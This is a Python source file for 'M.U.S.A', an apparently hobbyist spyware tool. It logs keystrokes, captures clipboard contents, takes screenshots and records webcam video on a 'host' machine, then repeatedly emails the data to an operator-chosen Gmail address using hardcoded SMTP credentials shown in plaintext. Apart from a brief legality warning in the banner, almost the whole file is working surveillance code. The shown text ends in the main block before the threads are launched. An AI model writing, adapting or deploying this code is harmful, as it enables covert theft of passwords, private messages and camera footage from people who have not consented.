""" I have shortcut-mechanism that can use. Searching for cameras. """

### This script has a lot of potential.
### It can:
###       - enable a key-logger at the host's machine.
###       - access the host's machine camera.
###       - capture the screen of the host's machine.
###       - get the clipboard of the host's machine.
###       - send all the data on a specified gmail adreess.
###
### It also check if the email that the user entered, the email in
###   which the email with the data will be sent to, exists or not.


from imghdr import what as get_type
from email.message import EmailMessage
from datetime import datetime
from time import sleep
from threading import Thread
from sys import exit, platform
from os import system, getcwd, remove, listdir
from argparse import ArgumentParser 
import smtplib


### The distinction of the libraries is based on build ins or not.
### The above mocules are all build ins and the users should have them by default 
###   installed on their machine.
### The bellow ones are not build ins, so somehow the user must import them in order
###   to start the script.

not_imported = []  # Here we appending all the libraries that the user hasm't installed.
explicit = False   # Here is the variable that will help us to figure out if the user has
                   #  installed on his/her machine.
browser = None     # Here is the browser that the user want to open to let the script know
                   #  if the email that he/she entered exists.

try:
    from pynput.keyboard import Key, Listener
except ModuleNotFoundError:
    not_imported.append("pynput")
try:
    from pyperclip import paste
except ModuleNotFoundError:
    not_imported.append("pyperclip")
try:
    import pyautogui
except ModuleNotFoundError:
    not_imported.append("pyautogui")
try:
    import cv2 as cv
except ModuleNotFoundError:
    not_imported.append("opencv-python")
try:
    from pyfiglet import figlet_format
except ModuleNotFoundError:
    not_imported.append("pyfiglet")
try:
    import colorama
except ModuleNotFoundError:
    not_imported.append("colorama")
try:
    import PIL
except ModuleNotFoundError:
    not_imported.append("pillow")
try:
    from selenium.common.exceptions import WebDriverException as InternetError
    from selenium.webdriver.firefox.options import Options as f_options
    from selenium.webdriver.chrome.options import Options as c_options
    from selenium.webdriver.opera.options import Options as o_options
    from selenium import webdriver

except ModuleNotFoundError:
    explicit = True
    not_imported.append("selenium")


### Note that we are appending the module name with which we are going to 
###   give the option to import it later.


class Main:
    ### This class is creating the varius threads and updating the global varaibles.
    ###   All the bellow prosseses run before the kick in of the script.

    @staticmethod
    def key_logger_thread(activate):
        global k_logger

        ### To start the script we always need to start the key-logger, so the user
        ###   can have a way to terminate the infinite loop. If we haven't created
        ###   the global variable 'k_logger' then if the user doesn't want to capture
        ###   the keyboard then we aslo doesn't have a way to terminate the script.
        k_logger = True if activate else False

        ### We need this exception block, because in the prosses of creating the
        ###   thread something, either with python, or the user's machine, could
        ###   break. So we prevent that.
        try:
            t = Thread(target=Key_Logger().start)

            if k_logger:
                ### Some accessories to make the script prettier.
                sleep(0.1)
                a = Helping_Functions()
                a.O_symbol()
                print(" Key logger thread has started successfully...")
                sleep(0.1)
        
            return t
        
        except Exception:
            ### Here we exclude the key-logger option and continue the script
            ###   as the user never choose this option.
            k_logger = False

            Helping_Functions().X_symnol()
            print(" Key logger thread is unable to start...")
            
            return None

    @staticmethod
    def screen_shot_thread():
        global screen_shot

        ### We need that exception block, becuase in the prosses of creating
        ###   the screenshot thread something, either python or the user's machine
        ###   can break. So we prevent a potential crash and undefine behaviour.
        try:
            ### Has a crousial role when we send the emails.
            screen_shot = True
            
            t = Thread(target=Screen_Shot().start)

            ### Some accessories to make the script fancier.
            sleep(0.1)
            Helping_Functions().O_symbol()
            print(" Screenshot thread has started successfully...")
            sleep(0.1)

            return t

        except Exception:
            ### Here we exclude from the script the screenshot option. So if the
            ###   script reaches this block of code then it will continue as the
            ###   the user never choose the screenshot option. 
            screen_shot = False

            Helping_Functions().X_symnol()
            print(" Screenshot thread is unable to start...")
            
            return None

    @staticmethod
    def clipboard_paster_thread():
        global paste_opt


        ### We need this exception block beacuse in the prosses of creating the
        ###   this thread something either with python or the user's machine can
        ###   can unexpectedly break.
        try:
            ### Fixes the email content.
            paste_opt = True

            t = Thread(target=Clipboard_Paster().start)

            ### Some accessoories to make the script looking better.
            sleep(0.1)
            Helping_Functions().O_symbol()
            print(" Clipboard paster thread has started successfully...")
            sleep(0.1)

            return t

        except Exception:
            ### If the script advances inside this block, then it will continue as
            ###   the user never choose the paster option. This way we prevent a major
            ###   undefine behaviour in our script.
            paste_opt = False
            
            Helping_Functions().X_symnol()
            print(" Clipboard paster thread is unable to start...")
            
            return None

    @staticmethod
    def camera_capture_thread():
        global camera_capture

        ### We need this exception block, so to prevent a potential and
        ###   unexpected error that might occur either with python or the
        ###   the user's machine, in the prosses of creating the camera
        ###   capture thread.
        try:
            ### Have a crousial role at the email prosses.
            camera_capture = True

            t = Thread(target=Camera_Capture().start)

            ### Some accessories to make the code prettier.
            sleep(0.1)
            Helping_Functions().O_symbol()
            print(" Camera capture thread has started successfully...")
            sleep(0.1)

            return t

        except Exception:
            ### If the script advances here then it continues as the user
            ###   never choose the option to capture the camera. Preventing
            ###   a potential undefine behaviour.
            camera_capture = False

            Helping_Functions().X_symnol()
            print(" Camera capture thread is unable to start...")

            return None

    @staticmethod
    def arguments_conditions():
        ### Here we need to collect all the arguments and figure out if the user
        ###   wants the helping guid or the script, to pop up.
        args = get_args()

        if args[4] or not (args[0] or args[1] or args[2] or args[3] or args[4]):
            Helping_Functions().help_guide()
            exit()

        return args

    @staticmethod
    def Mail():
        ### We need this exception block in the case either python or user's machine
        ###   unexpectedly break, in the prosses of creating the email thread.
        try:
            t = Thread(target=send_mail)
            
            return t
        except Exception:
            ### If the script advances here that means that something went wrong
            ###   and this thread is very important for the script, so we need to
            ###   exit.
            Helping_Functions().X_symnol()
            print(" Something went very wrong, please try again...")
            exit()


class Screen_Shot:
    ### This class provides the screnshot thread the start method.
    ### The method that will create the infinite loop and take screenshots
    ###   from the user's screen.

    @staticmethod
    def take_screen_shot():
        ### Just to make the code more functional we create this static method.
        image = pyautogui.screenshot()
        image.save("screen_shot.png")

    def start(self):
        ### This is aon of the main prosseses.
        global run, is_sending_s

        while run:
            ### It will run until the user presses the 'esc' button, or If the
            ###   script somehow terminated (some crash/error). 
            if not is_sending_s:
                ### This 'is_sending' global variable is one of the most important here.
                ###   It a way to sent an email, then to wait for the photo to be taken and
                ###   then again to send the email and goes on.
                self.take_screen_shot()

                is_sending_s = True


class Key_Logger:
    ### This class is the heart of the script. It always run no matter what the
    ###   user choose. It uses the 'pynput' module to capture the keys that the
    ###   user presses.

    @staticmethod
    def on_press(key):
        ### This method is activated each time the user presses a key.
        global keys, k_logger, run, shortcuts

        ### If the user choose the key logger option then we updating the key
        ###   global variable with a nice format, else we skip.
        if k_logger:
            date = '-'.join(str(datetime.now()).split(' ')[0].split('-')[::-1])
            curr_time = str(datetime.now()).split(' ')[1].split('.')[0]
            temp = str(key).replace("'", "")
            keys += f"{date} | {curr_time}: {temp}<br>"

        ### Note that we have created a mechanism that allows the user to create
        ###   keyboard shortcuts. Might help later.
        if len(shortcuts) == 2:
            shortcuts.pop(0)

        shortcuts.append(str(key).replace("'", ""))

        if (key == Key.esc):
            ### If the user presses the 'esc' key then we terminate the script.
            run = False

            Helping_Functions().X_symnol()
            print(" Script is terminating (terminating each thread)...")            
            
            return False

    def start(self):
        ### Nessacary to 'pynput'.
        with Listener(on_press=self.on_press) as listener:
            listener.join()


class Clipboard_Paster:
    ### This class provides the paster thread the main method.

    @staticmethod
    def start():
        global run, pastes

        clipboard_pastes = []

        ### The bellow block will run until the user presse the 'esc' key.
        while run:
            ### This condition prevents us to collect repeatedly the same and the
            ###   same pastes, that lived inside the clipboard.
            if paste() not in clipboard_pastes:
                clipboard_pastes.append(paste())

                date = str(datetime.now()).split(' ')[0].split('-')
                date = '-'.join(date[::-1])
                curr_time = str(datetime.now()).split(' ')[1].split('.')[0]
                pastes += f"{date} | {curr_time}: {paste()}<br>"

            sleep(0.5)


class Camera_Capture:
    ### This class provides the camera capture thread the main method.

    @staticmethod
    def available_cameras():
        ### This method is searching for cameras to connect in the range that the
        ###   user has specified and then returning the camera that the user wants
        ###   else returning None.
        global camera_index, camera_range

        cameras = []
        for i in range(camera_range):
            cap = cv.VideoCapture(i, cv.CAP_DSHOW)
            if cap is not None and cap.isOpened():
                cameras.append(i)

        ### This exception block is nessecary becuases in the case that the script
        ###   was unable to find a camera to connect, we would get an error. 
        try:
            return cameras[camera_index] if len(cameras) != 0 else None
        except IndexError:
            return None

    def start(self):
        global run, seconds_per_sending, is_sending_c, camera_capture

        video_time = 0

        ### This loop will go on until the user presses the 'esc' button, or something
        ###   unexpectedly breaks.
        while run:
            ### The concept of this method is clear. The majic starts when we collect
            ###   the available cameras and creating the video and writer objects
            if not is_sending_c:
                camera_index = self.available_cameras()
                if camera_index is not None:
                    video = cv.VideoCapture(camera_index, cv.CAP_DSHOW)
                    video_width,video_heigth  = int(video.get(3)), int(video.get(4))
                    video_name = "camera_capture.mp4"
                    wrter = cv.VideoWriter(video_name, cv.VideoWriter_fourcc(*"mp4v"), 10, (video_width, video_heigth))

                    ### Here is the majic part of this code. We writing the video of the
                    ###   specified camera for some seconds, ( the seconds that the user choose 
                    ###   with the -t flag ), then we stop and after the email with the data is
                    ###   send we start again this prosses. 
                    while video_time < seconds_per_sending * 10:
                        is_working, frame = video.read()
                        if is_working:
                            wrter.write(frame)
                        else:
                            Helping_Functions().X_symnol()
                            print(" Camera cannot be reached...")
                            ### We need this remove here because by default the writer is creating a file
                            remove(video_name)
                            break

                        video_time += 1
                    else:
                        ### This block of code is reached each time the script is ready to send
                        ###   the email.
                        video_time = 0
                        is_sending_c = True
                        video.release()
                        wrter.release()
                else:
                    ### This code is run only if the script doesn't find any camera to connect.
                    Helping_Functions().X_symnol()
                    print(" Cannot find any camera to connect...")
                    camera_capture = False
                    break


class Helping_Functions:

    @staticmethod
    def load_frame():
        global clear

        ### This funtion has created to make the code DRY.
        ###    It's the logo of the script.

        system(clear)
        print()
        print(colorama.Fore.LIGHTBLUE_EX, "*"*100)
        print(colorama.Style.RESET_ALL)
        print(figlet_format("        M . U . S . A .", font="slant"), end='')
        print(colorama.Fore.LIGHTYELLOW_EX, "   v5.0\t\t\t\t\t\t\t\t   by Peter-Jacob Floratos")
        print(colorama.Fore.LIGHTBLUE_EX, "*"*100)
        print(colorama.Style.RESET_ALL, end='')
        print(colorama.Fore.LIGHTBLACK_EX, "Warning...\n"
        " The script you are currently using can be illegal if you don't have the proper permissions. I am not\n"
        " advise you to continue if you don't have them. The responsibility for all the actions you do with\n"
        " this script is yours.", end="\n\n\n")
        print(colorama.Style.RESET_ALL, end='')

    @staticmethod
    def ctrl_c_exit(funct):
        ### This decorator prevent the script for crashing if the user presses
        ###   Ctrl + C when he/her should enter an email to start the script
        def wrapper(*args, **kwargs):
            rv = None
            try:
                rv = funct(*args, **kwargs)
            except KeyboardInterrupt:
                print('\n')
                print(" [", end='')
                print(colorama.Fore.RED, "X", end='')
                print(colorama.Style.RESET_ALL, "]", end='')
                print(" Rage quit...")
                exit()

            return rv
        return wrapper

    @staticmethod
    def X_symnol():
        ### Just to make the script prettier.

        print(" [", end='')
        print(colorama.Fore.RED, "X", end='')
        print(colorama.Style.RESET_ALL, "]", end='')

    @staticmethod
    def O_symbol():
        ### Just to make the script fancier.

        print(" [", end='')
        print(colorama.Fore.GREEN, "O", end='')
        print(colorama.Style.RESET_ALL, "]", end='')

    @staticmethod
    def get_os():
        ### This is a crousial funtion because it allow us to make the
        ###   script multi-platform.

        if platform.startswith("win"):
            return "Windows"
        return "Linux"

    @staticmethod
    def driver_in_path():
        global driver_path, browser

        ### Checking if the path that the user has specified contains the web driver.
        if browser == "Firefox":
            if 'geckodriver.exe' in listdir(driver_path):
                return True
        elif browser == "Chrome":
            if "chromedriver.exe" in listdir(driver_path):
                return True
        else:
            if "operadriver.exe" in listdir(driver_path):
                return True

        return False

    def help_guide(self):
        ### Again this function makes the code much more DRY.
        ### It's the helping guide, the how to use script option.

        self.load_frame()
        print(colorama.Fore.LIGHTBLUE_EX, "~>", colorama.Style.RESET_ALL, end='')
        print("Usages", end='')
        print(colorama.Fore.LIGHTBLUE_EX, ':', colorama.Style.RESET_ALL, end='')
        print("musascript_console.py [-k] [-p] [-c index,range] [-a index,range] [-s] [-e] [-b] [-P] [-h] [-t]")
        print("             musascript.pyw [-k] [-p] [-c index,range] [-a index,range] [-s] [-e] [-b] [-P] [-h] [-t]\n")
        print(colorama.Fore.LIGHTBLUE_EX, "~>", colorama.Style.RESET_ALL, end='')

        print("Options", end='')
        print(colorama.Fore.LIGHTBLUE_EX, ':', colorama.Style.RESET_ALL, end='\n\n')
        
        print("     -k or --key_logger", end='')
        print(colorama.Fore.LIGHTBLUE_EX, ':', colorama.Style.RESET_ALL, end='')
        print("Enables key logger to the hosts machine.")

        print("     -p or --clipboard", end='')
        print(colorama.Fore.LIGHTBLUE_EX, ' :', colorama.Style.RESET_ALL, end='')
        print("Captures the clipboard of the host machines.")

        print("     -c or --camera", end='')
        print(colorama.Fore.LIGHTBLUE_EX, '    :', colorama.Style.RESET_ALL, end='')
        print("Accesses the camera that have been specified.")

        print("        - index", end='')
        print(colorama.Fore.LIGHTBLUE_EX, '        :', colorama.Style.RESET_ALL, end='')
        print("The index of the camera that will be captured.")

        print("        - range", end='')
        print(colorama.Fore.LIGHTBLUE_EX, '        :', colorama.Style.RESET_ALL, end='')
        print("The range of camera indexes that will be searched.")

        print("     -s or --screenshot", end='')
        print(colorama.Fore.LIGHTBLUE_EX, ':', colorama.Style.RESET_ALL, end='')
        print("Takes screenshots of the hosts machine.")

        print("     -a or --all", end='')
        print(colorama.Fore.LIGHTBLUE_EX, '       :', colorama.Style.RESET_ALL, end='')
        print("Activates all options (-k, -p, -s, -c) together.")

        print("     -e or --email", end='')
        print(colorama.Fore.LIGHTBLUE_EX, '     :', colorama.Style.RESET_ALL, end='')
        print("The email that the results of the scripts will be send.")

        print("     -b or --browser", end='')
        print(colorama.Fore.LIGHTBLUE_EX, '   :', colorama.Style.RESET_ALL, end='')
        print("The browser to access when checking the email (-P required).")

        print("     -P or --path", end='')
        print(colorama.Fore.LIGHTBLUE_EX, '      :', colorama.Style.RESET_ALL, end='')
        print("The full path of the drowser driver (-b required).")
        
        print("     -t or --time", end='')
        print(colorama.Fore.LIGHTBLUE_EX, '      :', colorama.Style.RESET_ALL, end='')
        print("The seconds between two email sendings.")

        print("     -h or --help", end='')
        print(colorama.Fore.LIGHTBLUE_EX, '      :', colorama.Style.RESET_ALL, end='')
        print("Opens the help guide.")
        print()


def send_mail():
    ### This function is the second heart of the script. It's work is simple
    ###   it only send an email.

    global run, mail_count, keys, pastes, is_sending_c, is_sending_s
    global camera_capture, screen_shot, paste_opt, k_logger, email

    ### To prevent the script sending an empty email.
    if not camera_capture and not screen_shot:
        mail_count = 0

    ### This loop will keep going till the user presses the 'esc' key, or if
    ###   something breaks unexpectedly.
    while run:

        ### We need those conditionals because if the user doesn't choose the
        ###   camera capture and the screenshot option this function will enable
        ###   the undefine behaviour. Thats why we creating the 'camera_capture'
        ###   and the 'screen_shot' global variables.
        if not camera_capture:
            is_sending_c = True

        if not screen_shot:
            is_sending_s = True

        if is_sending_c and is_sending_s:
            message = EmailMessage()
            message["From"] = "MUSAscript@gmail.com"
            message["To"] = email
            message["Subject"] = f"M.U.S.A -> {mail_count}"

            ### This is the part that 'k_logger' and the 'paste_opt' global variables
            ###   has created for. Just to organize much better the content of the email
            ###   that contains all the data.
            if k_logger and paste_opt:
                message.add_alternative(f"""
                <!DOCTYPE HTML>
                <html>
                    <body>
                        <hr>
                        <h2> <p style="color:#C20000;"> Kyes: </p> </h2>
                        <h4> {keys} </h4>
                        <hr>
                        <h2> <p style="color:#C20000;"> Pastes: </p> </h2>
                        <h4> {pastes} </h4>
                        <hr>
                    </body>
                </html>
                """, subtype="html")
            elif k_logger:
                message.add_alternative(f"""
                <!DOCTYPE HTML>
                <html>
                    <body>
                        <hr>
                        <h2> <p style="color:#C20000;"> Kyes: </p> </h2>
                        <h4> {keys} </h4>
                        <hr>
                    </body>
                </html>
                """, subtype="html")
            elif paste_opt:
                message.add_alternative(f"""
                <!DOCTYPE HTML>
                <html>
                    <body>
                        <hr>
                        <h2> <p style="color:#C20000;"> Pastes: </p> </h2>
                        <h4> {pastes} </h4>
                        <hr>
                    </body>
                </html>
                """, subtype="html")
            else:
                message.add_alternative("""
                <!DOCTYPE HTML>
                <html>
                    <body>
                        <hr>
                    </body>
                </html>
                """, subtype="html")

            ### When the script advances here means, if the user choose the
            ###   screenshot option, that it has saved the screenshot on the
            ###   current directory and it's ready to read the content of the file
            ###   to send it later to the email. If the user didn't choose the
            ###   screenshot option then the script is cathing the FilNotFoundError
            ###   and continues.
            try:
                with open(f"{getcwd()}{slash}screen_shot.png", 'rb') as img:
                    image_data = img.read()
                    image_name = img.name
                    image_type = get_type(image_name)

                message.add_attachment(image_data, maintype="image", subtype=image_type, filename=f"screen_shot_{mail_count}.png")
            except FileNotFoundError:
                pass
            
            ### The same as above with the difference that here we are getting the content
            ###   of the video that the camera has captured.
            try:
                with open(f"{getcwd()}{slash}camera_capture.mp4", "rb") as video:
                    video_data = video.read()

                message.add_attachment(video_data, maintype="video", subtype="mp4", filename=f"camera_capture_{mail_count}.mp4")
            except FileNotFoundError:
                pass
            
            ### Now it is time to connect to the account that we have created to send the emails
            ###   to the users. After that we finally send the content to the gmail that the users
            ###   have specified.
            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as conn: # 587, m 465
                try:
                    if mail_count == 0:
                        mail_count = 1
                    else:
                        conn.login("MUSAscript@gmail.com", "musamusamusa")
                        conn.send_message(message)
                        mail_count += 1
                except smtplib.SMTPAuthenticationError:
                    ### This exception block activated only if the account that the script
                    ###   uses to send emails has the 'allow less secure apps' OFF.
                    print(" [", end='')
                    print(colorama.Fore.RED, "X", end='')
                    print(colorama.Style.RESET_ALL, "]", end='')
                    print(" Something is wrong with the script, please try again later...")
                    run = False
                    sleep(0.5)
                    pyautogui.press("esc")
            
            ### Clearing the mess that this script is leaving and continue with the next iteration.
            try:
                remove("screen_shot.png")
            except FileNotFoundError:
                pass
            try:
                remove("camera_capture.mp4")
            except FileNotFoundError:
                pass

            is_sending_c = False
            is_sending_s = False

        sleep(seconds_per_sending)

    sleep(4)

    ### Clearing the finall mess.
    try:
        remove("screen_shot.png")
    except FileNotFoundError:
        pass
    try:
        remove("camera_capture.mp4")
    except FileNotFoundError:
        pass


def get_args():
    ### This function is collecting and modifying the arguments that the user passes 
    ###   to the script.

    global camera_index, camera_range, seconds_per_sending, check_email, browser, slash, driver_path

    ### Here we creating the argument parser object, so we can expect certain argument flags
    ###   from the user. 
    parser = ArgumentParser(add_help=False)
    parser.add_argument("-k", "--key_logger", nargs='?', const=True, default=False)
    parser.add_argument("-p", "--clipboard", nargs='?', const=True, default=False)
    parser.add_argument("-s", "--screenshot", nargs='?', const=True, default=False)
    parser.add_argument("-c", "--camera", nargs='?', const=True, default=False)
    parser.add_argument("-t", "--time", nargs='?', const=True, default=False)
    parser.add_argument("-h", "--help", nargs='?', const=True, default=False)
    parser.add_argument("-e", "--email", nargs='?', const=True, default=False)
    parser.add_argument("-a", "--all", nargs='?', const=True, default=False)
    parser.add_argument("-b", "--browser", nargs='?', const=True, default=False)
    parser.add_argument("-P", "--path", nargs='?', const=True, default=False)

    ### Creating a dictionary with keys all the name of the arguments and values, the
    ###   value that the user passes to them.
    args, _ = parser.parse_known_args()
    args = vars(args)


    ### Here begins the process of modifying the argument values.
    if args["all"]:
        try:
            all_args = args["all"].split(',')

            ### By using the conditionals we can prevent the IndexError, that bellow
            ###   we fix using try/except block.
            if len(all_args) == 1:
                camera_index = int(all_args[0])
            elif len(all_args) == 2:
                camera_index, camera_range = int(all_args[0]), int(all_args[1])
            else:
                pass
        except AttributeError:
            ### The script gets an AtributeError when the user passes no values, meaning that
            ###   if the user doesn't pass any argument with the -a flag then we would get an error.

            print("~> Musa is unable to start because 'all' / '-a' option takes two argument, non is given...")
            print("~> Example: musascript.py -a [camera_index],[camera_range]")
            print("~> Where: ")
            print("        [camera_index]: The camera that you want to capture.")
            print("        [camera_range]: The range of cameras that you want to search.")
            exit()
        except ValueError:
            ### If the user passes as sub-arguments on the -a argument any value that has not
            ###   int data type, then the script will get a ValueError.

            print("~> Musa is unable to start due to one of those reasons:")
            print("        1. 'all' / '-a' arguments must only be 'int' type.")
            print("        2. You can only use ',' If you want to pass two arguments.")
            print("        3. You are not allowed to pass ... -a 4, 2 for example, only ... -a 4,2")
            exit()

        ### Enabling all the options, the full potential of the script.
        args["key_logger"], args["clipboard"], args["screenshot"] = True, True, True
        args["camera"] = str(camera_index) + ',' + str(camera_range)


    ### Modifying the camera arguments that the user has passed.
    if args["camera"]:
        try:
            ### We are updating the camera index and range global variables. But this
            ###   prosses must be carefully, because the user can pass whatever he/her
            ###   wants.
            camera_args = args["camera"].split(',')
            camera_index, camera_range = int(camera_args[0]), int(camera_args[1])
        except AttributeError:
            ### First exception is AtrributeError. This exception the user get when he/her
            ###   is passing zero sub-argument to the camera argument, where it needs at least
            ###   one.

            print("~> Musa is unable to start because 'camera' / '-c' option takes two argument, non is given...")
            print("~> Example: musascript.py -c [camera_index],[camera_range]")
            print("~> Where: ")
            print("        [camera_index]: The camera that you want to capture.")
            print("        [camera_range]: The range of cameras that you want to search.")
            exit()
        except ValueError:
            ### The second is ValueError. User gats this error when he/her passes only one
            ###   sub-argument for camera and then comma. Also he/her would get ValueError
            ###   when he/her would pass non intager value to either of the two sub-arguments.

            print("~> Musa is unable to start due to one of those reasons:")
            print("        1. 'camera' / '-c' arguments must only be 'int' type.")
            print("        2. You can only use ',' If you want to pass two arguments.")
            print("        3. You are not allowed to pass ... -c 4, 2 for example, only ... -c 4,2")
            exit()
        except IndexError:
            ### If the user passes only one sub-argument with no comma afterwards then he/her 
            ###   would get an IndexError. We allow the user to pass only one sub-argument that
            ###   will respond to the camera index global variable. The camera range will be one
            ###   number larger that the camera index one.
            camera_index = int(camera_args[0])
            camera_range = camera_index + 1

    ### Here we fix something that the user might do, to pass as camera range a number smaller
    ###   than the camera index.
    if camera_index >= camera_range:
        camera_range = camera_index + 1


    ### Modifying the browser argumet.
    if args["browser"] and args["path"]:
        ### Checking if the user passed the correct value of the browser argument
        ###   and then we updating the values of 'check_email' and 'browser' global
        ###   variables.

        if (args["browser"] == "chrome") or (args["browser"] == 'c'):
            browser = "Chrome"
        elif (args["browser"] == "firefox") or(args["browser"] == 'f'):
            browser = "Firefox"
        elif (args["browser"] == "opera") or (args["browser"] == 'o'):
            browser = "Opera"
        else:
            ### If the code prosseds here, that means that the user has entered invalid
            ###   browser argument.

            print("~> Musa is unable to start because an invalid browser argument has been passed.")
            print("~> Valid browser options are:")
            print("        1. chrome - c")
            print("        2. firefox - f")
            print("        3. opera - o")
            exit()

        check_email = True
    else:
        check_email = False


    ### Modifying the path argument, the path that the browser driver lives.
    if args["path"] and browser is not None:
        ### Getting the path of the folder that the user has the driver browser installed.
        try:
            sectors = args["path"].split(slash)
            driver_path = slash.join([sect for sect in sectors if sect != '']) + '\\'
            driver_path = driver_path.replace('---', ' ')
            listdir(driver_path) # This will raise the errors.

        except FileNotFoundError:
            ### The script is going to get a FileNotFoundError if the path that tht user has
            ###   passed is not valid (does not exists).

            print("~> Musa is unable to start because the path that has beed passed does not exists.")
            print(f"~> You have passed: '{driver_path}'")
            print("~> Note that spaces can be passed as '---'")
            exit()
        except NotADirectoryError:
            ### It will also get a NotADirectoryError if the path that the user has specified
            ###   is not actualy a path, but a file, or something else.

            print("~> Musa is unable to start because the path that has been specified is not a path.")
            print(f"~> You have passed: '{driver_path}'")
            exit()


    ### Here we modify the argument that the user passes for the time.
    try:
        if int(args["time"]) <= 0 or isinstance(args["time"], bool):
            raise ValueError
        else:
            args["time"] = int(args["time"])
    except ValueError:
        ### If the user passes as time argument an alpharithmetic expression or doesn't
        ###   pass any at all we raise ValueError and assign default time of 5 secs.
        args["time"] = 5

    seconds_per_sending = args["time"]


    ### This script is giving the choice to pass an email at the time the command is written
    ###   on the command line. In this case the script is skiping the email gui type prosses.
    try:
        if (args["email"].startswith("@gmail.com") and args["email"].endswith("@gmail.com")) or not args["email"].endswith("@gmail.com"):
            print("~> Musa is unable to start because an invalid email is being pass.")
            print("~> Valid email: email_name@gmail.com")
            exit()
    except AttributeError:
        ### If the user doesn't choose to pass an email then we default assign None value to the
        ###   email argument.
        args["email"] = None


    ### The bellow block of code is rejecting every argument that is not nessacary, meaning that assigns
    ###   True to all the arguments that the user passes except of time, camera and email.
    for arg in args.items():
        if not isinstance(arg[1], bool) and (arg[0] != "time") and (arg[0] != "camera") and (arg[0] != "email"):
            args[arg[0]] = True


    return [args["key_logger"], args["clipboard"], args["camera"], args["screenshot"], args["help"], args["time"], args["email"]]


@Helping_Functions.ctrl_c_exit
def email_getter(error):
    ### This function gives the option to the user to insert an email address throught
    ###   the command line. Note that this function uses the above initialized decorator
    ###   'ctr_c_exist', to prevent the script for crushing when the user presses Ctrl C.

    if error:
        ### This conditional is True only if the user enter an email that is invalid.
        Helping_Functions().X_symnol()
        print(" Email is not valid: [email_name@gmail.com]", '\n')

        while True:
            choice3 = input(" Do you want to try again? (y-yes/n-no): ")
            if (choice3 != 'n') and (choice3 != "no") and (choice3 != 'y') and (choice3 != "yes"):
                print()
                Helping_Functions().X_symnol()
                print(" Invalid input... Please try again.")
                print()
            else:
                break
            
        if (choice3 == 'n') or (choice3 == "no"):
            exit()

    Helping_Functions().load_frame()

    ### Recieving the email from the user
    email = input(" ~> Email: ")
    print()

    ### Checking if the email is valid or not. If its valid then the script advances, else calling itself
    ###  but with the above contitional set to True.
    if not (email.startswith("@gmail.com") and email.startswith("@gmail.com")) and email.endswith("@gmail.com"):
        while True:
            choice = input(" Do you want to continue? (y-yes/n-no): ")
            if (choice != 'n') and (choice != "no") and (choice != 'y') and (choice != "yes"):
                print()
                Helping_Functions().X_symnol()
                print(" Invalid input... Please try again.")
                print()
            else:
                break

        if choice == 'n' or choice == "no":
            exit()

        elif choice == 'y' or choice == "yes":
            return email
    else:
        return email_getter(True)


@Helping_Functions.ctrl_c_exit
def email_exist():
    global browser, driver_path, email

    ### This function is connecting to a selenium browser and tries to enter to the gmail
    ###   acount that the user has passed. According to the different responses from goole
    ###   the script can know if the email exists or not.

    ### Figuring out if the driver lives inside the path that the user have specified.
    if not Helping_Functions().driver_in_path():
        return False, 0

    ### This conditional helping us to make the script more portable. It's setting the
    ###   headless option to True, meaning that the browser never opens, the user will never
    ###   know that we use selenium and creating the driver object.
    if browser == "Firefox":
        options = f_options()
        options.headless = True
        driver = webdriver.Firefox(executable_path=driver_path + "geckodriver.exe", options=options, service_log_path="NUL")

    elif browser == "Chrome":
        options = c_options()
        options.headless = True
        driver = webdriver.Chrome(executable_path=driver_path + "chromedriver.exe", options=options, service_log_path="NUL")
    else:
        options = o_options()
        options.headless = True
        driver = webdriver.Opera(executable_path=driver_path + "operadriver.exe", options=options, service_log_path="NUL")

    ### This try block is nessacary because it prevent the script for crashing when the
    ###   user is not connected to the internet.
    try:
        ### Here we 'openning' the browser at the locating of the gmail enterance.
        driver.get("https://accounts.google.com/signin/v2/identifier?service=mail&passive=true&rm=false&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ss=1&scc=1&ltmpl=default&ltmplcache=2&emr=1&osid=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin")
        
        ### Waiting 5 seconds to open and find the input box, sent the email and then press the submit button
        driver.find_element_by_id("identifierId").send_keys(email)
        driver.find_element_by_class_name("VfPpkd-vQzf8d").click()

        sleep(1) ### Nessacary constant, to wait until the screen loads

        ### This is the 'response' of google, if this element: 'o6cuMc' exist then
        ###   we are returning False, meaning that the email does not exists, else False.
        if len(driver.find_elements_by_class_name("VfPpkd-vQzf8d")) > 0:
            driver.quit()
            return False, None

    except InternetError:
        ### The user is going to get this error if he/her is not connected to the
        ###   internet.
        Helping_Functions().X_symnol()
        print(" You have not internet access. Troubleshoot and try again.")
        Helping_Functions().X_symnol()
        print(" Script is terminating...")
        sleep(2)
        driver.quit()
        exit()

    driver.quit()
    return True, None

    ### If the script returns False, 0, that means that the browser driver does not exist
    ###   in path. If returns False, None, that means that the email does not exists and if
    ###   it returns True, None, then the email exists and the script continue as expecred


if __name__ == "__main__":
    ### This is the main function. The brain of the script that connects every aspect
    ###   of it.

    ### Just some multi-platform stuff.
    clear = "cls"
    slash = '\\'
    if Helping_Functions().get_os() != "Windows":
        clear = "clear"
        slash = '/'

    ### The bollow part of the script is only accessed if the user has all the modules
    ###   installed in his/her machine.
    if len(not_imported) == 0:
        colorama.init()  ### Is nessacary for the colorama module. 

        ### Creating all the global variables that will connect the threads together.
        run = True
        keys, pastes = '', ''
        shortcuts = []
        seconds_per_sending, mail_count = 0, 1
        is_sending_c, is_sending_s = False, False
        k_logger, screen_shot, paste_opt, camera_capture  = False, False, False, False
        check_email, browser, driver_path = False, None, ''
        camera_index, camera_range = 0, 1

        ### This line is checking if the user wants to see to help guide or not.
        args = Main().arguments_conditions()

        ### And here we conclude if the user wants the email prosses or not.
        if args[6] is None:
            email = email_getter(False)
        else:
            email = args[6]

        ### If the email that the user passed does not exist, or the path that
        ###    he/she has passed does not include the driver, the script will
        ###   terminate.
        if browser and check_email:

            ### Poping up the logo of the script.
            Helping_Functions().load_frame()
            print(" MUSA is trying to find the email that has been specified")
            print(colorama.Fore.LIGHTBLUE_EX, '-'*100, colorama.Style.RESET_ALL)
            
            exist, error = email_exist()
            if error == 0:
                ### The script will reach this block of code if the driver does not live inside
                ###   the path that the user has passed.

                Helping_Functions().X_symnol()
                print(" Musa is unable to continue because the browser driver does not exist on the specified path.")
                Helping_Functions().X_symnol()
                print(f" Specified path: {driver_path}")
                exit()
            elif not exist:
                ### The script will advance here if the email that the user has specified does
                ###   not exists.

                Helping_Functions().X_symnol()
                print(" Musa is unable to continue because the email that have been specified does not exist.")
                Helping_Functions().X_symnol()
                print(f" Specified email: {email}")
                exit()

